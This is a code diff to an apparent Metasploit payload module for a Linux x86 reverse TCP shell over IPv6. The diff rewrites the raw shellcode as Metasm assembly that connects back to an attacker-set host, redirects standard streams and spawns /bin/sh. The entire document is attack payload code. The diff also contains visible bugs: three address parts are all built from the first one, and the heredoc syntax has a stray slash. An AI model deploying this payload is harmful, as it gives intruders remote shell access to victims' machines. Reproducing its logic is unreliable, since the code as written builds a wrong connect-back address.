@@ -3,6 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -19,7 +20,7 @@ module MetasploitModule
     super(merge_info(info,
       'Name'          => 'Linux Command Shell, Reverse TCP Inline (IPv6)',
       'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
-      'Author'        => 'Matteo Malvica <matteo[at]malvica.com>',  # avanzo
+      'Author'        => 'Matteo Malvica <matteo[at]malvica.com>',
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
       'Arch'          => ARCH_X86,
@@ -28,23 +29,130 @@ module MetasploitModule
     ))
   end
 
-  def generate
-      target_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../) # convert LHOST to expanded IPv6 address in hex format
+def generate_stage(opts={})
+        
+      temp =  [datastore['LPORT'].to_i].pack('S>')
+      tcp_port = temp.unpack('H*')
 
-      "\x31\xdb\xf7\xe3\x6a\x06\x6a\x01\x6a\x0a\x89\xe1\xb0\x66\xb3\x01" +
-      "\xcd\x80\x89\xc6\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xd8\x74\x02" +
-      "\x77\x70\x31\xc9\x31\xdb\x53\x53" +
-      "\x68" + target_ipv6[3]  + # push each address dword on the stack in reverse order
-      "\x68" + target_ipv6[2]  +
-      "\x68" + target_ipv6[1]  +
-      "\x68" + target_ipv6[0]  +
-      "\x53\x66\x68" + [datastore['LPORT'].to_i].pack('S>') + # push the TCP port on the stack
-      "\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x31\xdb\x31\xc0\xb0\x66\xb3" +
-      "\x03\x89\xe1\xcd\x80\x31\xdb\x39\xd8\x75\x36\x31\xc9\xf7\xe1\x89" +
-      "\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xc0" +
-      "\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xd2\xf7\xe2\x52\x68\x2f\x2f\x73" +
-      "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" +
-      "\xc3\x31\xdb\x53\x6a\x0a\xf7\xe3\x89\xe3\xb0\xa2\xcd\x80\xeb\x91" +
-      "\xc3\x31\xc0\xb0\x01\xcd\x80"
+      order = (order = [3, 2, 1, 0])
+      my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
+      first = (my_ipv6[0].unpack('H*')).to_s.scan(/../)
+      first.pop
+      first.shift
+      first = (order.map{|x| first[x]}).join('')
+
+      second = (my_ipv6[1].unpack('H*')).to_s.scan(/../)
+      second.pop
+      second.shift
+      second = (order.map{|x| first[x]}).join('')
+
+      third = (my_ipv6[2].unpack('H*')).to_s.scan(/../)
+      third.pop
+      third.shift
+      third = (order.map{|x| first[x]}).join('')
+
+      fourth = (my_ipv6[3].unpack('H*')).to_s.scan(/../)
+      fourth.pop
+      fourth.shift
+      fourth = (order.map{|x| first[x]}).join('')
+
+
+    payload_data =<<-EOS/
+        xor  ebx,ebx
+        mul  ebx
+        push 0x6
+        push 0x1
+        push 0xa
+        mov  ecx,esp
+        mov  al,0x66
+        mov  bl,0x1
+        int  0x80
+        mov  esi,eax
+        xor  eax,eax
+        mov  al,0x2
+        xor  ebx,ebx
+        int  0x80
+        cmp eax,ebx
+        je connect
+        ja exit
+
+      connect:
+        xor  ecx,ecx
+        xor  ebx,ebx
+        push ebx
+        push ebx
+
+        push #{fourth}
+        push #{third}
+        push #{second}
+        push #{first}
+
+        push ebx
+        push.i16 0x#{tcp_port}
+        push.i16 0xa
+        mov ecx, esp
+        push.i8 0x1c
+        push ecx
+        push esi
+        xor ebx,ebx
+        xor eax,eax
+        mov al,0x66
+        mov bl,0x3
+        mov ecx,esp
+        int 0x80
+
+        xor ebx,ebx
+        cmp eax,ebx
+        jne retry
+
+        xor ecx,ecx
+        mul ecx
+        mov ebx,esi
+        mov al,0x3f
+        int 0x80
+
+        xor eax,eax
+        inc ecx
+        mov ebx,esi
+        mov al,0x3f
+        int 0x80
+
+        xor eax,eax
+        inc ecx
+        mov ebx,esi
+        mov al,0x3f
+        int 0x80
+
+        xor edx,edx
+        mul edx
+        push edx
+        push 0x68732f2f
+        push 0x6e69622f
+        mov ebx,esp
+        push edx
+        push ebx
+        mov ecx,esp
+        mov al,0xb
+        int 0x80
+        ret
+
+      retry:
+        xor ebx,ebx
+        push ebx
+        push.i8 0xa
+        mul ebx
+        mov ebx,esp
+        mov al,0xa2
+        int 0x80
+        jmp connect
+        ret
+
+      exit:
+        xor eax,eax
+        mov al,0x1
+        int 0x80
+    EOS
+
+    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
   end
 end
